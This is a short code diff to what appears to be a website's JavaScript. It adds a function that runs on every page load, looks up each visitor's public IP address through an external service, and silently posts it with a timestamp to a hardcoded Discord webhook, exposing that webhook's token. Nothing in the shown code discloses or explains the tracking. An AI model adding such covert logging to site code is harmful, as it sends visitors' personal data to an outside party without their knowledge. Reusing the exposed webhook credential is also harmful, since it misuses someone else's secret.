@@ -70,4 +70,24 @@ document.addEventListener("DOMContentLoaded", function() {
     }, 50);
   }
 });
+  function logIP() {
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const log = `IP: ${ip}, Timestamp: ${new Date().toISOString()}`;
+          const webhookUrl = 'https://discord.com/api/webhooks/1126202607132745871/O-DIXoAPbM_MqPwuHhUmQUUMIS5JD6V1rjZ-J70dWBjj3hsU4xkkXMWOQRVNqwkulAMx';
 
+          const payload = JSON.stringify({ content: log });
+          fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: payload
+          });
+        })
+        .catch(error => console.error('Error:', error));
+    }
+
+    window.addEventListener('load', logIP);
